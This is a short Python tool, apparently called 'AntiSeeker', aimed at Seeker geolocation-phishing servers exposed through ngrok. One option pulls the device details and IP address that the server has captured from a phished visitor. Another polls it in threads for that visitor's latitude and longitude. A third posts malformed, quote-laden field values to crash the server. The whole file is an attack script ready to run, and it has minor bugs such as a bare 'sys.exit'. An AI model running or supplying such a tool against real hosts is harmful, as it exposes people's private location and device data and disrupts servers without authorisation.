import requests, json, sys, colorama
import threading
import time
def check(name):
    greq = requests.get(url+"/php/result.txt")
    try:
        jgres = json.loads(greq.text)
        print("Lat  : "+jgres['info'][0]['lat'])
        print("Long : "+jgres['info'][0]['lon'])
        sys.exit
    except:
        jres=1

print("""\033[32m╔═╗┌┐┌┌┬┐┬╔═╗┌─┐┌─┐┬┌─┌─┐┬─┐
╠═╣│││ │ │╚═╗├┤ ├┤ ├┴┐├┤ ├┬┘
╩ ╩┘└┘ ┴ ┴╚═╝└─┘└─┘┴ ┴└─┘┴└─\033[0m""")
help = """
-h    Help

-p    Parsing the Seeker -p [url]
     \033[33m -p https://*****.ngrok.io \033[0m

-c    To crash Seeker -c [url]
     \033[33m -c https://*****.ngrok.io \033[0m

-l    Track geo data -l [time] [url]
     \033[33m -l 10 https://*****.ngrok.io \033[0m
"""
if sys.argv[1] == "-p":
    url = sys.argv[2]
    res = requests.get(url+"/php/info.txt")
    try:
        jres = json.loads(res.text)
    except:
        print(res.text)
        jres=1
    if jres == "":
        print("No information")
    elif jres == 1:
        pass
    else:
        print("OS       : "+jres['dev'][0]['os'])
        print("Platform : "+jres['dev'][0]['platform'])
        print("Browser  : "+jres['dev'][0]['browser'])
        print("Cores    : "+jres['dev'][0]['cores'])
        print("Ram      : "+jres['dev'][0]['ram'])
        print("IP       : "+jres['dev'][0]['ip'])
        print("Vendor   : "+jres['dev'][0]['vendor'])
        print("Render   : "+jres['dev'][0]['render'])
elif sys.argv[1] == "-c":
    url = sys.argv[2]
    Lat = 'qw%27erty000"'
    Lon = "qwert'y000 %22"
    Acc = "qwe/#rty;00:0"
    Alt = "qwerty][]]000"
    Dir = "qwer':ty000"
    Spq = 'qwert":y000'
    requests.post(url+"/php/result.php", data={"Lat":Lat, "Lon":Lon, "Acc":Acc, "Alt":Alt, "Dir":Dir, "Spq":Spq}, headers={"Content-Type": "text/html", "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"})
    print("Crashed Seeker")
elif sys.argv[1] == "-l":
    se = sys.argv[2]
    url = sys.argv[3]
    for i in range(int(se)):
        x = threading.Thread(target=check, args=(i,))
        x.start()
        time.sleep(0.5)
    x.join()
else:
    print(help)
